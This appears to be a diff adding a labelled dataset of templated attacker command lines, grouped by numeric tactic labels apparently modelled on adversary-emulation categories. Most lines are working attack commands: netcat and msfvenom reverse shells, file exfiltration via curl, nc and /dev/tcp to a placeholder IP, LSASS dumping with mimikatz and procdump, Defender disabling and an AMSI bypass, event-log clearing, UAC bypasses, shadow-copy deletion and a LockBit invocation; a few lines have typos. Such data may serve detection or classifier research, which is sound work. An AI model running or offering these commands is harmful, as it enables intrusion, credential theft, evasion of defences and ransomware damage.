@@ -1,0 +1,364 @@
+0 cmd.exe /c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0 powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0 echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+0 mail -s ${email_subject} ${username}@${domain} < mail.txt
+0 echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+0 echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+0 cat email.txt | mutt -s ${email_subject} ${username}@${domain}
+0 echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
+0 echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+0 cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+0 sendmail ${username}@${domain} < mail.txt
+0 echo ${email_content} | sendmail ${username}@${domain}
+0 cat email.txt | sendmail ${username}@${domain}
+0 ssmtp ${username}@${domain} < mail.txt
+0 echo -e ${email_content} | ssmtp ${username}@${domain}
+0 cat email.txt | ssmtp ${username}@${domain}
+0 mstsc /v:${ip_address} /f
+0 mstsc /v:${ip_address} 
+0 mstsc /v:${computer_name} /f
+0 mstsc /v:${computer_name} 
+0 SharpRDP.exe computername=${ip_address} command="${command_to_execute}" username=${domain}\${username} password=${password}
+0 psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0 psexec \\${ip_address} -i ${command_to_execute}
+0 psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
+0 psexec \\${ip_address} -u ${username} -p ${password} script.txt
+0 plink -ssh ${ip_address} -l ${username} -pw ${password}
+0 plink ${username}@${ip_address}
+0 putty -ssh ${ip_address} -l ${username} -pw ${password}
+0 putty -ssh ${username}@${ip_address} -pw ${password}
+0 putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
+0 putty -ssh ${username}@${ip_address} -pw ${password} -m script.txt
+1 .\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
+1 schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+1 sc create win32times binPath="${command_to_execute}"
+1 nc -c sh ${ip_address} ${port}
+1 nc ${ip_address} ${port} -e sh
+1 nc.exe ${ip_address} ${port} -e sh
+1 ncat ${ip_address} ${port} -e sh
+1 ncat.exe ${ip_address} ${port} -e sh
+1 curl -Ns telnet://${ip_address}:${port}
+1 rcat connect -s sh ${ip_address} ${port}
+1 telnet ${ip_address} ${port}
+1 nc -l ${ip_address} ${port}
+1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1 msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1 msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f jsp -o reverse.jsp
+1 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+1 msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+1 msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1 msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
+1 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v ${value_name} /t REG_DWORD /f /d ${value}
+1 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ${value_name} /t REG_DWORD /f /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
+1 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ${value_name} /t REG_DWORD /d ${value}
+2 net group "domain admins" /domain
+2 cmd.exe /c "whoami"
+2 wmic useraccount get /ALL
+2 quser /SERVER:${computer_name}
+2 quser /server:${computer_name}
+2 quser
+2 quser ${username}
+2 qwinsta.exe /server:${computer_name}
+2 qwinsta.exe /SERVER:${computer_name}
+2 qwinsta.exe
+2 qwinsta.exe ${username}
+2 [System.Environment]::UserName
+2 $env:UserName
+2 [System.Security.Principal.WindowsIdentity]::GetCurrent() 
+2 echo Username: %USERNAME%
+2 echo User Domain: %USERDOMAIN% 
+2 net users
+2 query user
+2 net user victim /domain
+2 net localgroup
+2 net localgroup "Administrators"
+2 get-localgroup
+2 Get-LocalGroupMember -Name "Administrators"
+2 wmic group get name
+2 net user /domain
+2 get-localgroupmember -group Users
+2 whoami
+2 nltest /domain_trusts
+2 nltest /dclist
+2 whoami /all
+3 curl -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
+3 xcopy ${source_file_path} ${destination_file_path}
+3 xcopy ${source_directory} ${destination_directory} /s /e
+3 robocopy ${source_directory} ${destination_directory} /e
+3 robocopy ${source_file_path} ${destination_file_path} /mir
+3 scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+3 pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+3 rsync -avz ${source_file_path} ${destination_file_path}
+3 rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+3 rclone.exe copy C:\Users\Public\collect.7z ${account}:backup 
+3 nc -vn ${ip_address} ${port} < ${source_file_path}
+3 cat ${source_file_path} > /dev/tcp/${ip_address}/${port}
+3 curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+3 curl -X POST --upload-file ${source_file_path} http://${ip_address}:${port}/upload
+3 curl -X POST -d "@${source_file_path}" http://${ip_address}:${port}/upload
+3 cat ${source_file_path} | nc ${ip_address} ${port}
+3 cat ${source_file_path} | nc -vn ${ip_address} ${port}
+3 telnet ${ip_address} ${port} < ${source_file_path}
+3 cat ${source_file_path} | telnet ${ip_address} ${port}
+3 socat - TCP:${ip_address}:${port} < ${source_file_path}
+3 cat ${source_file_path} | socat - TCP:${ip_address}:${port}
+3 wget --post-file=${source_file_path} ${ip_address}:${port}
+3 Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path}
+3 Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path} -Asynchronous
+3 cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+3 scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+3 CertReq -Post -config ${destination_file_path} ${source_file_path}
+3 sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+3 certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
+3 Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
+4 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "rundll32.exe ${VGAuthService.dll_path},VoidFunc" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "rundll32.exe ${VGAuthService.dll_path},VoidFunc" /f
+4 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
+4 New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+4 reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+4 New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+4 New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+4 New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "${command_to_execute}"; New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+4 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+4 akagi32 23 ${command_to_execute}
+4 akagi64 61 ${command_to_execute}
+4 Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+4 Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
+4 reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
+4 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+4 assoc ${extension_to_change}=${target_extension_handler}
+4 PPID-Spoof -ppid ${parent_pid} -spawnto "${command_to_execute}" -dllpath "${dll_path}"
+4 Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_to_execute}' -ParentId ${parent_pid}
+4 Start-ATHProcessUnderSpecificParent  -ParentId ${parent_pid} -TestGuid ${test_guid}
+4 Start-Process -FilePath ${parent_path} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine "${command_to_execute}"
+4 red add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "${command_to_execute}"
+4 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /d "${command_to_execute}"
+4 Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"  -Name "Atomic Red Team" -Value "${command_to_execute}"
+4 Copy-Item "${local_file_path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+4 Copy-Item "${local_file_path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+4 Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "powershell" -Value "${command_to_execute}"
+4 red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+4 red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+4 red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+4 red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+4 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
+5 Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+5 Add-MpPreference -ExclusionExtension ""${excluded}"
+5 Stop-Service -Name ${service_name}; Remove-Service -Name ${service_name}
+5 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+5 Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+5 Add-MpPreference -ExclusionPath "${excluded}"
+5 sc stop WinDefend && sc config WinDefend start=disabled
+5 net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
+5 rm -f ${local_file_path}
+5 rm -rf ${local_directory_path}
+5 del /f ${local_file_path}
+5 rmdir /s /q ${local_directory_path}
+5 Remove-Item -path ${local_file_path}
+5 Remove-Item -Path ${local_directory_path} -Recurse
+5 schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+5 sc create win32times binPath= "${command_to_execute}"
+5 schtasks /create /tn win32times /sc onlogon /tr "${command_to_execute}"
+5 schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
+5 Add-MpPreference -ExclusionProcess "${excluded}"
+5 rundll32.exe ${dll_file},${entry_point}
+5 powershell.exe -EncodedCommand [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("${command_to_execute}"))
+5 wevtutil cl system
+5 wevtutil cl application
+5 wevtutil cl security
+5 wevtutil cl ${log_name}
+5 Get-EventLog -List | ForEach-Object {$_.Log} | ForEach-Object {Clear-EventLog -LogName $_ }
+5 fltmc.exe unload ${sysmon_driver}
+5 sysmon -u
+5 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+5 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+6 procdump -ma lsass.exe lsassdump.dmp
+6 sekurlsa::minidump lsassdump.dmp
+6 sekurlsa::logonPasswords
+6 rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full
+6 procdump -accepteula -ma lsass.exe lsassdump.dmp
+6 rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsassdump.dmp full
+6 nanodump.x64.exe -w lsassdump.dmp
+6 mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
+6 pypykatz live lsa
+6 procdump -accepteula -mm lsass.exe lsassdump.dmp
+6 Invoke-Mimikatz -DumpCreds
+6 nanodump.x64.exe --silent-process-exit lsassdump.dmp
+6 cmdkey /list
+6 lazagne.exe windows -mscache
+6 sekurlsa::logonpasswords ful
+6 powershell -c  "rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full"
+6 powershell -c  "procdump -ma lsass.exe lsassdump.dmp"
+6 vssadmin create shadow /for=C:
+6 copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
+6 reg SAVE HKLM\SYSTYEM ${local_file_path}
+6 ntdsutil "ac i ntds" "ifm" "create full ${local_file_path}" q q
+6 wmic shadowcopy call create Volume=C:
+6 wmic /node:"${ip_address}" shadowcopy call create Volume=C:
+6 wmic /node:"${ip_address}" process call create "cmd.exe /c esentutl.exe /y /vss ${source_file_path} /d ${destination_file_path}"
+6 (gwmi -list win32_shadowcopy).Create("C:","ClientAccessible")
+6 powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+6 powershell -c "vssadmin create shadow /for=C:"
+6 powershell -c "wmic shadowcopy call create Volume=C:"
+6 powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
+6 cmd.exe /c "wmic shadowcopy call create Volume=C:"
+7 xcopy ${source_file_path} \\${ip_address}\${destination_file_path} /Y
+7 xcopy ${source_file_path} \\${ip_address}\${destination_file_path}
+7 xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e
+7 scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}
+7 scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+7 pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+7 copy ${source_file_path} \\${ip_address}\${destination_file_path}
+7 Copy-Item ${source_directory} -Destination "\\${ip_address}\C$\${destination_directory}" -Recurse
+7 rsync -avz ${source_file_path} ${destination_file_path}
+7 scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+7 rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+7 cmd.exe /c "net use \\${computer_name}\${destination_file_path} ${password} /u:${username}"
+7 net use \\${computer_name}\${destination_file_path} ${password} /u:${username}
+7 PsExec64.exe \\${ip_address} -s ${command_to_execute}
+7 psexec.exe \\${ip_address} -s ${command_to_execute}
+7 powershell -c "PsExec64.exe \\${ip_address} -s ${command_to_execute}"
+7 psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+7 powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+7 mstsc /v:${ip_address} /f
+7 mstsc /v:${ip_address} 
+7 mstsc /v:${computer_name} /f
+7 mstsc /v:${computer_name} 
+7 SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
+7 powershell -c "SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\\${username} password=${password}"
+7 cmd.exe /c "SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\\${username} password=${password}"
+7 powershell -c "mstsc /v:${ip_address} /f"
+7 powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
+7 powershell -c "xcopy ${source_file_path} \\${ip_address}\${destination_file_path}"
+7 powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
+7 powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+8 dir ${source_file_path} -Recurse | Compress-Archive -DestinationPath ${destination_file_path}
+8 7z a archive.7z ${source_file_path}
+8 cp -r ${source_directory} ${destination_directory}
+8 copy ${source_file_path} ${destination_file_path}
+8 Copy-Item ${source_file_path} -Destination ${destination_file_path}
+8 Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse
+8 Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
+8 tar -cvzf archive.tar.gz ${source_directory}
+8 tar -cvf archive.tar ${source_directory}
+8 tar -cvfW archive.tar ${source_directory}
+8 tar -zcvf archive.tar.gz ${source_directory}
+8 zip -r archive.zip ${source_directory}
+8 zip archive.zip ${source_file_path}
+8 zip -q archive.zip ${source_file_path}
+8 zip -m archive.zip ${source_file_path}
+8 zip -er archive.zip ${source_directory}
+8 zip -e archive.zip ${source_file_path}
+8 cp ${source_file_path} ${destination_file_path}
+8 powershell -c "copy ${source_file_path} ${destination_file_path}"
+8 compress ${source_file_path}
+8 rar a archive.rar ${source_directory}
+8 7z a archive.7z ${source_file_path} -p${password}
+8 7z a archive.zip ${source_file_path}
+8 7z a archive.zip ${source_file_path} -p${password}
+8 7z a archive.7z ${source_directory}
+8 7z a archive.7z ${source_directory} -p${password}
+8 powershell -c "Copy-Item ${source_file_path} -Destination ${destination_file_path}"
+8 powershell -c "Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse"
+8 Copy-Item ${source_file_path} -Destination ${destination_file_path} -Recurse -Container
+8 cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
+9 curl ${source_file_path} -o $ ${destination_file_path}
+9 cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+9 powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
+9 rsync -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+9 rsync -r ${username}@${ip_address}:${source_directory} ${destination_directory} 
+9 scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+9 scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+9 sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+9 sftp  ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+9 cmd /c "certutil -urlcache -split -f ${source_file_path} ${destination_file_path}"
+9 msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+9 echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+9 powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+9 powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+9 cmd.exe /c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+9 cmd.exe /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+9 plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+9 powershell -c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+9 cmd.exe /c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+9 wget https://${ip_address}/${destination_file_path}
+9 bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}
+9 cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+9 powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+9 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+9 msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+10 lockbit.exe -pass ${password}
+10 7z a -p${password} ${destination_file_path} ${source_file_path}
+10 7z a ${destination_file_path} ${source_file_path} -p${password}
+10 7z a -p${password} -mhe=on ${destination_file_path} ${source_file_path}
+10 openssl enc -pbkdf2 -in ${source_file_path} -out ${destination_file_path}
+10 gpg.exe -c ${source_file_path}
+10 cmd.exe /c "gpg.exe -c ${source_file_path}"
+10 powershell -c "gpg.exe -c ${source_file_path}"
+10 sc.exe stop ${service_name}
+10 cmd.exe /c "sc.exe stop ${service_name}"
+10 powershell -c "sc.exe stop ${service_name}"
+10 cmd.exe /c "lockbit.exe -pass ${password}"
+10 powershell -c "lockbit.exe -pass ${password}"
+10 net.exe stop ${service_name}
+10 cmd.exe /c "net.exe stop ${service_name}"
+10 powershell -c "net.exe stop ${service_name}"
+10 taskkill.exe /f /im ${process_name}
+10 cmd.exe /c "taskkill.exe /f /im ${process_name}"
+10 powershell -c "taskkill.exe /f /im ${process_name}"
+10 cipher.exe /w:C:
+10 cmd.exe /c "cipher.exe /w:C:"
+10 powershell -c "cipher.exe /w:C:"
+10 vssadmin.exe delete shadows /all /quiet
+10 wmic.exe shadowcopy delete
+10 wbadmin delete catalog -quiet
+10 powershell -c "vssadmin.exe delete shadows /all /quiet"
+10 powershell -c "wmic.exe shadowcopy delete"
+10 wbadmin delete systemstatebackup -keepVersions:0
+10 cmd.exe /c "vssadmin.exe delete shadows /all /quiet"
+10 cmd.exe /c "wmic.exe shadowcopy delete"
+10 cmd.exe /c "wbadmin delete systemstatebackup -keepVersions:0"
+10 powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
+11 powershell -c "${command_to_execute}"
+11 cmd.exe /c "${command_to_execute}"
+11 cscript "${jscript}" 
+11 cscript "${jscript}" > ${local_file_path}
+11 powershell -c "${command_to_execute}" > ${local_file_path}
+11 cmd.exe /c "${command_to_execute}" > ${local_file_path}
+11 wscript "${jscript}"
+11 wscript "${jscript}" > ${local_file_path}
+11 choco install -y 7zip
+11 cmd.exe /c "choco install -y 7zip"
+11 powershell -c "choco install -y 7zip"
+11 choco install -y putty
+11 cmd.exe /c "choco install -y putty"
+11 powershell -c "choco install -y putty"
+11 choco install 7zip
+11 cmd.exe /c "choco install 7zip"
+11 powershell -c "choco install 7zip"
+11 choco install putty
+11 sc.exe create ${service_name} binPath="${command_to_execute}"
+11 sc.exe start ${service_name}
+11 psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+11 psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
+11 powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+11 cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+11 cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+11 powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+11 cmd.exe /c "choco install putty"
+11 powershell -c "choco install putty"
+11 PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+11 cmd.exe /c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+11 powershell -c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
